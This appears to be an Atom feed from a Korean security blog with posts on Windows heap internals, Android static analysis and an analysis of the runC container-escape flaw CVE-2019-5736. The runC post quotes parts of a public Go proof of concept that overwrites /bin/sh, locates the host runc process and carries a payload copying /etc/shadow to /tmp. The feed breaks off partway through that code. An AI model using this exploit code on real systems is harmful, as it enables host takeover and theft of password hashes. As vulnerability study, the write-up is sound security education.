<?xml version="1.0" encoding="utf-8"?>

<feed xmlns="http://www.w3.org/2005/Atom" >
  <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
  <link href="/tag/posts/feed.xml" rel="self" type="application/atom+xml" />
  <link href="/" rel="alternate" type="text/html" />
  <updated>2019-04-07T14:41:55+09:00</updated>
  <id>/tag/posts/feed.xml</id>

  
  
  

  
    <title type="html">LIN ARENA | </title>
  

  
    <subtitle>LIN ARENA Technology Blog</subtitle>
  

  

  
    
      
    
      
    
      
    
      
    
      
    
  

  
  

  
    <entry>
      <title type="html">Windows-Heap 정의</title>
      <link href="/windows-0x0a" rel="alternate" type="text/html" title="Windows-Heap 정의" />
      <published>2019-04-02T20:18:00+09:00</published>
      <updated>2019-04-02T20:18:00+09:00</updated>
      <id>/windows-0x0a</id>
      <content type="html" xml:base="/windows-0x0a">&lt;h1 id=&quot;0x0a-windows-heap&quot;&gt;0x0a Windows-Heap&lt;/h1&gt;

&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;

&lt;p&gt;오늘부터는 Windows Heap에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;what-is-heap&quot;&gt;What is Heap?&lt;/h5&gt;

&lt;p&gt;Heap은 프로세스가 실행되는 동안 메모리를 필요한만큼 동적으로 할당하여 사용하는 영역입니다.&lt;/p&gt;

&lt;p&gt;그리고 c/c++에서는 malloc, new 함수를 사용하여 Heap 영역을 할당받아 사용합니다.&lt;/p&gt;

&lt;p&gt;윈도우에서는 힙을 이용할 수 있도록 API 함수들을 제공하고 있는데 대표적인 윈도우 힙 함수는 다음과 같습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;HeapCreate : 힙을 생성합니다.&lt;/li&gt;
  &lt;li&gt;HeapDestroy : 힙을 삭제합니다.&lt;/li&gt;
  &lt;li&gt;HeapAlloc : 힙 블록을 할당합니다.&lt;/li&gt;
  &lt;li&gt;HeapFree : 할당된 힙 블록을 해제합니다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이 정도는 이미 알고 계실거라 생각합니다.&lt;/p&gt;

&lt;p&gt;그럼 조금만 더 상세하게 알아볼게요.&lt;/p&gt;

&lt;h5 id=&quot;process-heap&quot;&gt;Process Heap&lt;/h5&gt;

&lt;p&gt;Process가 시작되면 최소한 하나의 기본 Process Heap(또는 Default Heap)이 생성됩니다.&lt;/p&gt;

&lt;p&gt;이 Process Heap은 Process 시작 시에 생성되고(기본 크기는 1MB) Process가 종료될 때까지 없어지지 않는 특징이 있습니다.&lt;/p&gt;

&lt;p&gt;흔히 사용하는 malloc, new는 Process Heap에서 할당하는 것입니다.&lt;/p&gt;

&lt;p&gt;이 기본 Heap은 프로그램 내에서 명시적으로 사용될 수도 있고 윈도우 내부 함수에 의해 암묵적으로 사용될 수도 있는데 프로그램에서 GetProcessHeap을 이용해 기본 Process Heap을 구할 수 있습니다.&lt;/p&gt;

&lt;p&gt;요약을 해보자면, Process가 시작되면 기본 Heap이 생성된다는 것과 malloc, new를 이용해서 아래 그림처럼 Heap을 할당받아 사용한다는 것입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;지금까지 기본 Heap에 대한 설명을 했는데요,&lt;/p&gt;

&lt;p&gt;지금부터는 위 그림처럼 하나만 할당받는 것이 아닌 다양한 크기의 Heap 공간을 반복적으로 할당/해제하는 경우를 한 번 생각해보겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;heap-fragmentation&quot;&gt;Heap Fragmentation&lt;/h5&gt;

&lt;p&gt;사용자가 Heap 공간을 쓰기 위해 할당을 요청하면 사용가능한 “연속된” 공간이 할당됩니다.&lt;/p&gt;

&lt;p&gt;그런데 다양한 크기의 Heap 공간을 요청하고 해제한다고 생각해봅시다.&lt;/p&gt;

&lt;p&gt;분명 할당받은 순서대로 해제하지는 않겠죠?&lt;/p&gt;

&lt;p&gt;정해진 순서없이 다양한 크기의 Heap이 할당되고 해제된다면, 아래 그림처럼 특정 순간에는 원하는 크기의 Heap을 할당해줄 수 없는 순간이 올 겁니다.&lt;/p&gt;

&lt;p&gt;이를 Heap Fragmentation(힙 단편화)이라고 합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 그림에서 보듯, 남은 메모리 용량의 총합은 할당을 원하는 객체의 크기보다 크지만 연속된 공간을 할당해 줄 수 없는 상황이 옵니다.&lt;/p&gt;

&lt;p&gt;윈도우는 이러한 단편화 문제를 해결하기 위해서 특별한 방식들을 사용하고 있습니다.&lt;/p&gt;

&lt;p&gt;이 방식들을 살펴보면서 Heap에 대한 이해를 더 높여보겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;free-list&quot;&gt;Free List&lt;/h5&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;
&lt;center&gt;http://www.slideshare.net/ffri/mr201312-history-and-current-state-of-heap-exploit-eng&lt;/center&gt;

&lt;p&gt;Free List란 말 그대로 해제된 Heap 메모리들을 담아두는 List입니다.&lt;/p&gt;

&lt;p&gt;어떤 메모리를 할당해서 사용하고 난 뒤, 해제를 하면 그 메모리는 Free List에 들어가게 됩니다.&lt;/p&gt;

&lt;p&gt;그리고 다음 메모리를 할당하려고 하면 Heap 공간을 바로 쓰게 해주는 것이 아니라 Free List를 먼저 살펴봅니다.&lt;/p&gt;

&lt;p&gt;Free List에 적합한 크기의 Heap 메모리가 있을 경우는 해당 메모리를 할당해줍니다.&lt;/p&gt;

&lt;p&gt;만약 적절한 크기의 메모리가 없다면 요청한 크기만큼의 Heap을 새로 할당해주는 방식입니다.&lt;/p&gt;

&lt;p&gt;예를 들어, 프로그램이 시작된 후 처음으로 0x20 크기의 Heap을 요청했다고 가정하겠습니다.&lt;/p&gt;

&lt;p&gt;해제된 메모리가 없으니 Free List는 비어있겠죠?&lt;/p&gt;

&lt;p&gt;그럼 Heap의 할당은 다음 그림처럼 이루어집니다.&lt;/p&gt;

&lt;p&gt;(실제로는 0x20 + Heap Header 크기만큼 할당이 이루어집니다.)&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그런 다음 이 메모리를 해제하게 되면 이 메모리는 Free List에 들어가게 됩니다.&lt;/p&gt;

&lt;p&gt;이후 프로그램이 다시 0x30 크기의 Heap을 요청하면 Free List를 먼저 살펴봅니다.&lt;/p&gt;

&lt;p&gt;0x30을 할당할 수 있을 만한 크기가 없기 때문에 새로 0x30만큼의 메모리를 할당해줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이번에는 0x10만큼의 메모리 할당 요청이 들어왔다고 가정하겠습니다.&lt;/p&gt;

&lt;p&gt;이번에도 Heap 관리자는 Free List를 먼저 살펴보겠지요?&lt;/p&gt;

&lt;p&gt;Heap 관리자는 Best-Fit 정책을 사용하고 있기 때문에 최대한 적합한 크기의 Heap을 할당하려고 합니다.&lt;/p&gt;

&lt;p&gt;지금 상황에서는 0x30이 제일 적합한 메모리가 되겠네요.&lt;/p&gt;

&lt;p&gt;이 0x30 메모리를 모두 할당하는 것이 아니라 메모리를 분할하여 0x10만큼만 할당을 해줍니다.&lt;/p&gt;

&lt;p&gt;그런데 이런 방식을 사용하는 환경에서 작은 메모리 요청/해제가 빈번하게 일어나면 어떻게 될까요?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0a_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;작은 메모리 조각이 계속해서 발생할 것이고 이를 관리하는 것에 한계가 생길 겁니다.&lt;/p&gt;

&lt;p&gt;이런 현상을 개선하기 위해서 최신 윈도우에서는 Low Fragmentation Heap이라는 정책을 도입했습니다.&lt;/p&gt;

&lt;h5 id=&quot;low-fragmentation-heap&quot;&gt;Low Fragmentation Heap&lt;/h5&gt;

&lt;p&gt;Low Fragmentation Heap(저단편화 힙)은 말 그대로 위에서 살펴본 Free List 방식에서 발생하는 단편화 현상을 줄이기 위해 도입되었습니다.&lt;/p&gt;

&lt;p&gt;Free List에서는 Heap을 계속해서 분할하는 방식이기 때문에 단편화 문제가 있다고 했었죠?&lt;/p&gt;

&lt;p&gt;그래서 Low Fragmentation Heap은 Bucket이라는 미리 정의된 서로 다른 크기의 범위를 갖는 블록을 관리함으로써 단편화를 해결합니다.&lt;/p&gt;

&lt;p&gt;쉽게 이야기해서, 미리 여러 크기로 Heap 공간을 분할해놓고 할당 요청이 오면 해당 크기를 포함하는 가장 작은 Bucket을 선택해 할당합니다.&lt;/p&gt;

&lt;p&gt;Bucket은 총 128개인데 첫 번째 Bucket은 1~8바이트, 두 번째는 9~16바이트 식으로 8바이트 단위로 구분되며, 마지막 Bucket은 15873~16384 바이트 크기까지 지원할 수 있습니다.&lt;/p&gt;

&lt;p&gt;만약 요청된 크기가 16384 바이트보다 크다면 Backend로 요청을 보냅니다.&lt;/p&gt;

&lt;p&gt;Backend로 요청이 이루어지면 Free List 방식으로 Heap 할당을 진행합니다.&lt;/p&gt;

&lt;p&gt;즉, Low Fragmentation Heap 기법은 미리 Bucket으로 나누어서 적합한 메모리를 찾는 속도를 증가시키고, 크기별 Free List들을 Lookaside List에 나누어 관리하는 것이죠.&lt;/p&gt;

&lt;p&gt;지금까지 Windows Heap 대해 알아봤습니다.&lt;/p&gt;

&lt;p&gt;다음 시간부터는 Heap에 대한 공격 기법을 살펴보도록 하겠습니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x0a Windows-Heap</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">android-0x01</title>
      <link href="/android-0x01" rel="alternate" type="text/html" title="android-0x01" />
      <published>2019-03-29T14:00:00+09:00</published>
      <updated>2019-03-29T14:00:00+09:00</updated>
      <id>/android-0x01</id>
      <content type="html" xml:base="/android-0x01">&lt;h1 id=&quot;android-정적-분석&quot;&gt;Android 정적 분석&lt;/h1&gt;

&lt;p&gt;안녕하세요 chaem 입니다.&lt;/p&gt;

&lt;p&gt;지난 포스팅에 이어서 이번에는 Android 정적 분석에 대해 포스팅 하려고 합니다.&lt;/p&gt;

&lt;p&gt;Android 정적 분석은 크게 2가지로 분류할 수 있습니다.&lt;/p&gt;

&lt;h4 id=&quot;-압축-해제-후-분석&quot;&gt;-압축 해제 후 분석&lt;/h4&gt;
&lt;p&gt;첫째로 Android 앱은 .apk 파일 확장자를 가지며, 압축된 형태이므로 압축을 해제한 후 해당 파일을 분석하는 방법입니다.&lt;/p&gt;

&lt;p&gt;아래 그림과 같이 apk 파일을 압축 해제하면 class.dex 파일이 생성되는 것을 확인할 수 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/01.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이 class.dex 파일을 dex -&amp;gt; jar -&amp;gt; java 로 decompile 하면 소스코드를 확인 할 수 있습니다.&lt;/p&gt;

&lt;p&gt;우선 dex2jar를 이용하여 dex -&amp;gt; jar로 decompile 합니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/02.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;jar 파일은 jd-gui를 이용해 decompile하여 소스코드를 확인할 수 있으며, 아래와 같이 난독화가 적용되어 있지 않으면 소스코드 분석을 통해 루팅 탐지 우회 등이 가능합니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/03.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;아래와 같이 jadx-gui를 이용하면 apk 파일을 바로 java 소스 코드로 확인할 수 있는 방법도 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/04.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;-decompile-후-분석&quot;&gt;-Decompile 후 분석&lt;/h4&gt;
&lt;p&gt;두번째는 apk파일을 decompile한 후 해당 파일을 분석하는 방법입니다.&lt;/p&gt;

&lt;p&gt;apktool을 이용하면 아래 그림과 같이 apk 파일이 decompile되는 것을 확인할 수 있습니다.
주요 분석 대상은 AndroidManifest 파일,  smali 코드, lib 폴더 등이 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/05.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;AndroidManifest.xml 파일은 해당 앱에 대한 권한 등의 필수적인 정보를 포함하고 있으며, 앱에서 불필요한 권한을 요청하고 있는지 확인해보아야 합니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/06.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;smali 코드는 An assembler/disassembler for Android’s dex format의 약자로 코드 분석을 통해 실행 원리를 파악할 수 있습니다. 따라서 코드 수정 후 리패키징을 통해 앱 변조가 가능합니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/07.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/08.png&quot; alt=&quot;[그림 1-8]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;lib 폴더 내에는 동적라이브러리인 *.so 파일을 포함하며, 보통 보안 솔루션들이 동적 라이브러리로 존재하고 있습니다. 아래 그림과 같이 IDA를 통해 분석이 가능하며, 보안 솔루션에서 루팅을 탐지하는 로직을 확인할 수 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x01/09.png&quot; alt=&quot;[그림 1-9]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;지금까지 Android 정적 분석에 대해 알아보았고, 다음 포스팅에서는 Android 동적 분석에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;감사합니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Chaem</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">Android 정적 분석</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">CVE-2019-5736 (runC Container 취약점)</title>
      <link href="/runC-Container" rel="alternate" type="text/html" title="CVE-2019-5736 (runC Container 취약점)" />
      <published>2019-03-28T02:43:00+09:00</published>
      <updated>2019-03-28T02:43:00+09:00</updated>
      <id>/runC%20Container</id>
      <content type="html" xml:base="/runC-Container">&lt;h2 id=&quot;cve-2019-5736-runc-container-취약점&quot;&gt;CVE-2019-5736 (runC Container 취약점)&lt;/h2&gt;

&lt;p&gt;안녕하세요. Sulla임돠!&lt;/p&gt;

&lt;p&gt;2월 11일 &lt;strong&gt;docker&lt;/strong&gt;관련 런타임인 &lt;strong&gt;runC&lt;/strong&gt; 관련 취약점 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 공개 되었습니다. 
공개된지 1주일도 안지나 &lt;strong&gt;POC&lt;/strong&gt;가 공개되고 있으며, 영향력도 큰 취약점으로 많은 주목을 받고있습니다.&lt;/p&gt;

&lt;p&gt;그래서 이번 포스팅에서는 해당 취약점에 대하여 리뷰해 보겠습니다.&lt;/p&gt;

&lt;h2 id=&quot;본-포스팅에서는-환경-구축버전-등의-정보는-제외하겠습니다&quot;&gt;[&lt;strong&gt;본 포스팅에서는 환경 구축/버전 등의 정보는 제외하겠습니다.]&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;먼저 &lt;strong&gt;docker&lt;/strong&gt;가 뭔지…&lt;strong&gt;runC&lt;/strong&gt;가 뭔지에 대해서 알아야겠죠??언제나 그렇듯 최대한 간단하고 필요한 내용만 쉽게 알아보겠습니다.(&lt;strong&gt;귀차니즘&lt;/strong&gt; 아닙니다…..)&lt;/p&gt;

&lt;p&gt;우선 &lt;strong&gt;docker&lt;/strong&gt;란 &lt;strong&gt;Linux&lt;/strong&gt; 기반의 &lt;strong&gt;container runtime 오픈소스 플랫폼&lt;/strong&gt; 입니다. 쉽게 말해 &lt;strong&gt;Container 관리 플랫폼&lt;/strong&gt;이며, &lt;strong&gt;VM&lt;/strong&gt;(Virtual Machine)과 비슷한 역할을 수행하지만 쉬운 배포 및 높은 확장성 등의 &lt;strong&gt;접근성&lt;/strong&gt;과 메모리 점유등의 &lt;strong&gt;성능&lt;/strong&gt;의 차이를 보입니다.(“&lt;strong&gt;가상화&lt;/strong&gt;“가 목표이긴 합니다.)&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-1.png&quot; alt=&quot;[그림 5736-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Docker의 기본 구성을 위 그림과 같이 표현했습니다. 각각의 역할을 알아 보겠습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Docker Engine : 사용자와 상호작용을 합니다.&lt;/li&gt;
  &lt;li&gt;Containerd : 직/간접적으로 호스트에서 컨테이너 전체 라이프 사이클을 관리합니다. (이미저 전송 및 저장, 컨테이너 실행 및 관리(runC 사용), 네트워크 인터페이스 관리 등)&lt;/li&gt;
  &lt;li&gt;Containerd-shim : runC를 사용해 컨테이너를 시작된 후에 runC가 종료 되어도 컨테이너가 실행 되도록합니다.&lt;/li&gt;
  &lt;li&gt;runC : 컨테이너를 실행하는 런타임이며, CLI 툴 입니다. (리눅스 커널 네임스페이스, Cgroups(프로세스의 자원 사용을 제한하는 커널 기능), Seccomp(리눅스 커널에서 샌드 박싱 메커니즘을 제공하는 보안 기능), 리눅스 보안 모듈 등)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;기본 구성 및 역할에 대하여 알아봤고 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약점에 직접적인 영향을 미치는 runC에 대해서 알아 보겠습니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;runC&lt;/strong&gt;는 &lt;strong&gt;container&lt;/strong&gt;의 &lt;strong&gt;생성/실행&lt;/strong&gt; 등을 위한 기본적인 기술이며 &lt;strong&gt;CLI&lt;/strong&gt; 도구입니다. 즉, &lt;strong&gt;container&lt;/strong&gt;의 &lt;strong&gt;조작&lt;/strong&gt;을 위해 존재 한다고 생각하면 될 것 같습니다. &lt;strong&gt;runC&lt;/strong&gt;는 Docker, containerd, Podman 및 CRI-O가있는 &lt;strong&gt;컨테이너의 기본 런타임&lt;/strong&gt;으로 사용됩니다.&lt;/p&gt;

&lt;p&gt;그럼 이번 포스팅의 주인공인 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt;에 대해서 알아보겠습니다.&lt;/p&gt;

&lt;h1 id=&quot;cve-2019-5736&quot;&gt;CVE-2019-5736&lt;/h1&gt;

&lt;p&gt;해당 취약점은 위에서 알아본 &lt;strong&gt;runC&lt;/strong&gt;에서 발생하는 취약점입니다. &lt;strong&gt;**컨테이너 내부에서 **루트 권한&lt;/strong&gt;으로 악의적인 프로세스를 실행할 경우 &lt;strong&gt;runC 버그&lt;/strong&gt;를 이용하여 컨테이터를 실행하는 &lt;strong&gt;호스트에 대한 루트 권한&lt;/strong&gt;을 탈취하는 취약점입니다. 따라서, 서버에 대한 접근 및 해당 서버의 다른 컨테이너 또한 접근이 가능합니다.&lt;/p&gt;

&lt;p&gt;쉽게 말해 &lt;strong&gt;악성 컨테이너&lt;/strong&gt;를 통해 &lt;strong&gt;호스트 서버의 루트 권한 탈취&lt;/strong&gt;가 가능하게 됩니다.&lt;/p&gt;

&lt;p&gt;해당 취약점의 트리거 방법은 다음중 하나 입니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;컨테이너 내부의 악성 프로세스 실행(루트로 실행되는 )&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;악성 docker 이미지를 실행&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;해당 취약점을 트리거 하기 위해서는 위에서도 언급했 듯 &lt;strong&gt;컨테이너 내부&lt;/strong&gt;에 &lt;strong&gt;루트 권한&lt;/strong&gt;이 있어야 합니다.&lt;/p&gt;

&lt;p&gt;화면 구성은 위쪽은 &lt;strong&gt;Host Server&lt;/strong&gt;, 아래쪽은 &lt;strong&gt;Container&lt;/strong&gt; 입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-2.png&quot; alt=&quot;[그림 5736-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;진행 자체는 굉장히 간단하게 진행됩니다.(물론 저는 삽질 했습니다……Aㅏ…..) 먼저 &lt;strong&gt;Host Server&lt;/strong&gt;쪽에 해당 파일이 없음을 확인 합니다. 후에는 컨테이너에서 악성 파일을 실행하면 준비가 끝납니다. 함정 처럼 &lt;strong&gt;/bin/sh&lt;/strong&gt;를 &lt;strong&gt;#!/proc/self/exe&lt;/strong&gt; 바꿔놓고 기다리는 단계입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-3.png&quot; alt=&quot;[그림 5736-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그리고 호스트가 컨테이너쪽으로  &lt;strong&gt;docker exec&lt;/strong&gt; 명령을 통해 &lt;strong&gt;/bin/sh&lt;/strong&gt;의 실행을 명하게 되면 위에서 설치해뒀던 함정이 발동하게 됩니다. 함정 카드….. &lt;strong&gt;(/bin/sh를 쓸것이라 추측하고 세팅 하는겁니다.)&lt;/strong&gt; 
다음으로 &lt;strong&gt;runC&lt;/strong&gt;의 &lt;strong&gt;PID&lt;/strong&gt;를 찾고 &lt;strong&gt;핸들링(O_PATH ,O_WRONLY 플래그 사용)&lt;/strong&gt;을 위한 여러 과정을 거치고 최종적으로 호스트의 &lt;strong&gt;runC&lt;/strong&gt; 바이너리 파일을 &lt;strong&gt;악성 runC&lt;/strong&gt; 로 변조되며 악성 파일에 미리 정의 되있던 행위를 &lt;strong&gt;호스트&lt;/strong&gt;쪽에서 &lt;strong&gt;루트 권한&lt;/strong&gt;으로 수행하게 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-4.png&quot; alt=&quot;[그림 5736-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;처음에는 없던 shadow 파일이 root 권한으로 생성된 것을 확인할 수 있습니다. 해당파일을 열람시 실제 shadow 파일임을 확인 가능합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-5.png&quot; alt=&quot;[그림 5736-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 과정을 거치면서 &lt;strong&gt;Host Server&lt;/strong&gt;쪽의 runC 파일이 변조됩니다. 해쉬값을 비교하면 쉽게 확인 가능하며 위쪽 해쉬값이 원본이면 아래쪽은 변조된 runC 바이너리의 해쉬값입니다.&lt;/p&gt;

&lt;p&gt;두 번째 방법의 경우는 첫 번쨰와 원리는 같으며 차이점은 악성 docker 이미지를 생성해서 배포하고 피해자는 해당 이미지를 다운받아 실행하게 되면 위에서와 같은 일련의 동작들을 수행하게 됩니다.&lt;/p&gt;

&lt;p&gt;보신것처럼 &lt;strong&gt;Container&lt;/strong&gt; 쪽에서 &lt;strong&gt;Host Server&lt;/strong&gt;의 &lt;strong&gt;root&lt;/strong&gt; 권한으로 악의적인 행위가 가능한 취약점입니다.&lt;/p&gt;

&lt;p&gt;어쩌다 이런 일이 생기는지 코드를 보면서 확인 해보겠습니다. (해당 poc코드는 go로 작성 되었습니다.)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var payload = &quot;#!/bin/bash \n cat /etc/shadow &amp;gt; /tmp/shadow &amp;amp;&amp;amp; chmod 777 /tmp/shadow&quot;

func main() {
	fd, err := os.Create(&quot;/bin/sh&quot;)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Fprintln(fd, &quot;#!/proc/self/exe&quot;)
	err = fd.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;우선 &lt;strong&gt;Container&lt;/strong&gt;에서 악성 프로세스를 실행하게 되면 위 코드가 실행됩니다.&lt;/p&gt;

&lt;p&gt;1라인의 행위를 위해 아래의 코드들이 쭉 진행됩니다.&lt;/p&gt;

&lt;p&gt;코드의 4라인에서 /bin/sh 를 생성 하고 fd에 저장 합니다. 다음으로 9라인에서 #!/proc/self/exe를 fd에 저장 합니다. Fprintln()함수는 첫 번째 인자에 두 번째 인자를 전달하는 기능을 수행 합니다. 첫 번째 인자인 fd는 /bin/sh이며 여기에 /proc/self/exe가 저장 되겠죠.&lt;/p&gt;

&lt;p&gt;위 코드의 동작을 해석 하자면 9라인의 &lt;strong&gt;#!/proc/self/exe(&lt;/strong&gt;해당 프로세스를 위해 실행된 바이너리를 가리키는 모든 프로세스에 대한 &lt;strong&gt;커널&lt;/strong&gt;이 만든 &lt;strong&gt;심볼릭 링크&lt;/strong&gt;입니다.&lt;strong&gt;)&lt;/strong&gt;는 현재 실행된 프로세스를 어떤놈이 실행 시켰는지에 대해 가리킵니다. 현재 실행된 프로세스는 Host에 의해서 실행된 /bin/sh 이죠. 따라서 /bin/sh을 실행 시킨놈은 Host의 &lt;strong&gt;runC&lt;/strong&gt;입니다.
다시 정리 해본다면, Host에서 Container의 /bin/sh을 &lt;strong&gt;docker exec&lt;/strong&gt;를 통해 실행 하는데 이 때 &lt;strong&gt;runC&lt;/strong&gt;가 사용 됩니다. 결국 &lt;strong&gt;#!/proc/self/exe&lt;/strong&gt;가 가리키는 놈은 &lt;strong&gt;Host의 runC&lt;/strong&gt;가 되고 &lt;strong&gt;/bin/sh&lt;/strong&gt;는 결국 Host의 &lt;strong&gt;runC&lt;/strong&gt;가 됩니다.
여기가 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약점의 주요 원인이라 판단이 됩니다. &lt;strong&gt;/proc/self/exe&lt;/strong&gt;가 가리키는 것에 대해서 &lt;strong&gt;부적절하게 처리함&lt;/strong&gt;으로서 위와 같은 행위가 가능해 지는것이죠.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var found int
	for found == 0 {
		pids, err := ioutil.ReadDir(&quot;/proc&quot;)
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, f := range pids {
			fbytes, _ := ioutil.ReadFile(&quot;/proc/&quot; + f.Name() + &quot;/cmdline&quot;)
			fstring := string(fbytes)
			if strings.Contains(fstring, &quot;runc&quot;) {
				fmt.Println(&quot;[+] Found the PID:&quot;, f.Name())
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;다음 코드에서는 runC가 구동 되는 동안 runC를 덮어쓸 수 없기 때문에 이를 해결 하기위한 코드가 짜여져 있는데 이 때 필요한 &lt;strong&gt;runC의 PID를 찾기위한 코드&lt;/strong&gt;입니다. /proc/[PID]/cmdline(해당 PID를 갖는 프로세스가 어떤 command로 실행 되었는지를 나타냅니다.)에 있는 모든 파일에서 runC를 찾고 결과적으로 runC의 PID를 확보 합니다.
즉, 모든 PID를 대상으로 어떤 친구가 runC를 실행 했는지 찾아 내는 과정입니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var handleFd = -1
	for handleFd == -1 {
		handle, _ := os.OpenFile(&quot;/proc/&quot;+strconv.Itoa(found)+&quot;/exe&quot;, os.O_RDONLY, 0777)
		if int(handle.Fd()) &amp;gt; 0 {
			handleFd = int(handle.Fd())
		}
	}
	fmt.Println(&quot;[+] Successfully got the file handle&quot;)

	for {
